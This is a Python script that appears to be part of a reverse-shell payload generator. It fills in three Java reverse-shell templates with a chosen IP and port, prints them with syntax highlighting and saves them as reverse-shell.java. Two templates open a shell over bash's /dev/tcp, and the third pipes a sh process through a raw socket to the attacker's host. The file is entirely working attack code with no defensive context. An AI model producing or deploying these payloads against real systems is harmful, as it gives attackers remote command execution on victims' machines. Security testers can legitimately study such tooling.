from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def JavaShell1(ip, port):
    payload = """public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/%s/%d 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}""" % (ip, port)
    with open("reverse-shell.java", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="pong"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"java",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.java\n[/#aed06d]", style=myStyle)

def JavaShell2(ip, port):
    payload = """public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/%s/%d 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}""" % (ip, port)
    with open("reverse-shell.java", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="squareCorners"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"java",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.java\n[/#aed06d]", style=myStyle)

def JavaShell3(ip, port):
    payload = """import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = "%s";
        int port = %d;
        String cmd = "sh";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}""" % (ip, port)
    with open("reverse-shell.java", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="squareCorners"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"java",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.java\n[/#aed06d]", style=myStyle)